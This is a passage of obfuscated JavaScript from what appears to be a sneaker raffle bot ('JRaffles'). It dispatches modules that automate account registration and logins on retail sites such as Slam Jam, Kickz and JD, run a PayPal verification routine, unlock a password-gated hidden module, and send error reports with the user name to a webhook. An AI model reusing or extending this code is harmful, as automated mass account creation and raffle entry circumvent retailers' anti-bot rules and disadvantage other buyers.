                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x568e8a = await _0x115f3f(), _0x156e63 = await _0x25bb74();
                                                return await _0x5e0b69('', _0x2b0777, _0x156e63, _0x568e8a), _0x5db02a();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x7d2206[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                                            var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x568e8a = await _0x115f3f(), _0x585af9 = await _0x25bb74();
                                                return await _0xa5005b('https://slamjam.nl/account/register', _0x2b0777, _0x585af9, _0x568e8a), _0x5db02a();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x568e8a = await _0x115f3f(), _0x585af9 = await _0x25bb74();
                                                    return await _0x78ac52('', _0x2b0777, _0x585af9, _0x568e8a), _0x5db02a();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x7d2206[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                                                var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x568e8a = await _0x115f3f(), _0x58f3f2 = await _0x25bb74();
                                                    return await _0x4b5fdb('https://www.kickz.com/nl/login/', _0x2b0777, _0x58f3f2, _0x568e8a), _0x5db02a();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x568e8a = await _0x115f3f(), _0x58f3f2 = await _0x25bb74();
                                                        return await _0x27e569(_0x2b0777, _0x58f3f2, _0x568e8a), _0x5db02a();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x7d2206[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x3f881c(_0x7d2206[taskModule]['modules']);
                                                    var _0x2b0777 = _0x7d2206[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x568e8a = await _0x115f3f(), _0x14c5cc = await _0x25bb74();
                                                        return await _0x40ef40(_0x2b0777, _0x14c5cc, _0x568e8a), _0x5db02a();
                                                    }
                                                } else {
                                                    if (_0x7d2206[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x29ac01(0x3e8), _0x5db02a();
                                                    else {
                                                        if (_0x7d2206[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0xd8b321 = _0x7d2206[taskModule]['name'], _0x568e8a = await _0x115f3f();
                                                            const _0x595452 = await _0x2a3ba6();
                                                            var _0x2516bb = _0x595452['split'](';');
                                                            await _0x182b7a(_0x2516bb, _0xd8b321, _0x568e8a);
                                                        } else {
                                                            if (_0x7d2206[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x234398 = 0x0;
                                                                for (const _0x5d0786 in _0x2cde8d) {
                                                                    console['log']('(' + _0x234398 + ')\x20' + _0x5d0786 + '\x20:\x20' + _0x2cde8d[_0x5d0786]), _0x234398++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x234398 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x371c49 = await _0x2c9d54();
                                                                if (_0x371c49 == _0x234398)
                                                                    return _0x5db02a();
                                                                console['clear'];
                                                                var _0x3a5711 = 0x0;
                                                                for (var _0x18883e in _0x2cde8d) {
                                                                    if (_0x371c49 == _0x3a5711) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x18883e + '\x20:'), _0x2cde8d[_0x18883e] = await _0x225ec6(), _0x45be1e['writeFileSync']('../settings.json', JSON['stringify'](_0x2cde8d));
                                                                        break;
                                                                    } else
                                                                        _0x3a5711++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x29ac01(0xbb8), _0x5db02a();
                                                            } else {
                                                                if (_0x7d2206[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x19de76(), _0x5db02a();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x7d2206[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x59c3ac = await _0x1d0c4f();
                                                                        _0x59c3ac == 'ModuleVoorDeBoys' ? (await _0x555691(), await _0x59b006(), await afewFunction(_0xa9c228[_0x4f48df], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x29ac01(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x5db02a();
        } catch (_0x287590) {
            return console['log'](_0x287590), await _0x29ac01(0x3a98);
        }
}
;
_0x757e32('JRaffles\x20' + _0x582dcf), _0x19de76();
try {
    _0x397815();
} catch (_0x3758aa) {
    var _0x52e7bc = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0xf76913
            },
            {
                'name': 'Version',
                'value': '' + _0x582dcf
            },
            {
                'name': 'Error',
                'value': '' + _0x3758aa
            }
        ]
    }];
    const _0x11e221 = { 'embeds': _0x52e7bc };
    _0x31fc49(_0x344612, _0x11e221);
}